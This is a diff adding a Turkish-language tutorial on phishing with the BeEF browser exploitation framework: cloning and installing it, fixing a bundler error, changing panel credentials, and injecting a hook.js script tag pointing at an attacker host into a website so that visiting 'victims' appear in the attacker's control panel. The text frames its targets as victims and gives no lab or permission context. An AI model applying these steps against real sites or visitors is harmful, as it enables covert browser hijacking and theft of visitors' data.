@@ -1,0 +1,32 @@
+BEEF İLE OLTALAMA SALDIRILARI 
+------------------------------------
+Beef uzun zaman önce kaliden kaldırıldığı için github üzerinden kurmamız gerekiyor.
+https://github.com/beefproject/beef uzantılı github adresini kopyalayıp komut ekranıma dönüyorum.
+hemen ardından önce admin yetkisi veip hemen ardından ise kodum ile beef i indiriyorum.
+>>> sudo su
+>>> git clonr https://github.com/beefproject/beef 
+indirme işlemi tamamlandıktan hemen sonra 
+>>ls
+komutu ile dosyaları sıralayıp
+>>cd beef 
+kodu ile ise beef klasörüne giriyorum. Karşıma bir sürü dosya çıktı fakat benim yapmam gereken şey ise install komutunu kullanarak beef i bilgisayara kurmak olacak. Kurulum için beef bash protokolünü kullanıyor biz de bash ile kullanmak için indirirken ./ şeklinde başlayacaz.
+>>> ./install 
+komutunu girerek artık kurulum için (Y)leri seçmeye başlayacağız. Ve hemen ardından kurulumumuz tamamlanıyor. Hemen ardından beef i başlatmaya koyulalım.
+>>> ./beef 
+komutu ile başlatıyoruz fakat bize bundler install hatası veriyor. Yani bir dosyanın tam olarak indirilmediğini anlıyoruz. Hemen biz de komut ekranını temizleyip işe koyuluyoruz.
+>>clear
+>>>bundler install
+Her şeyi kurduğumuza göre geriye pek önemli olmayan ama ilerisi için elzem bir konuya deyineceğim.
+Burada beef ile aldığımız verileri izleme panelinde izlemek için girdiğimiz parola ve kullanıcı adını ayarlayabiliyoruz. Bu normalde kullanıcı adı "beef" şifre "beef" şeklinde gelir fakat değiştirmekte fayda var. Bunun için konsolumuza şifrelerin saklandığı config.yaml adlı dosyayı düzenliyoruz bunun için.
+>>>nano config.yaml 
+kodu ile notpad ile ayarlama yapabiliyoruz. Hemen beef yazılı şifre ve kullanıcı adını değiştiriyoruz. crtl+ x e basılınca iki defa enter a basılınca tüm kayıt işlemlerimiz tamamlanıyor.
+bu kurulum da bittiğine göre geriye bir şey kalmıyor tek yapmamız gereken tekrardan beef i açmaya çalışmak.
+>>> ./beef 
+ve evet işte linklerimiz geldi karşımıza gelen .js uzantılı link bizim kurban ile aramızdaki köprü diyebilirim. Bundan dolayı hiç bir sekmeyi kapatmamaya özen göstermeliyiz. Ayrıca sitemiz ve bu sitenin yanında "ui/panel" şeklindeki uzantı bizim admin panelimiz olup yukarda değiştirdiğimiz şifre ile giriş yapıyor hareketleri iziliyoruz. Fakat önce .js ile biten kodumuzu bir yere entegre etmemiz gerekiyor.
+Beef kodunu sitemize atabiliriz veya başka bir alanda anlattığım gibi IP adresimiz üzerine kurulu site üzerinden linki enjekte edebliriz.
+
+-----------------------------------------------------------------------
+Sitemizin body bölümüne gelerek önce script adlı tagı oluşturuyor hemen ardından src nin içine uzantımızı atıyoruz.
+
+---- <script src="https://10.0.2.15/hook.js"> </script>
+kodunu yapıştırıyoruz tabiki bu kod örnek olarak verildi. kurbanın siteye girmesini bekliyoruz. Siteye giren kurbanın bilgileri admin panelimizde gözükecektir.
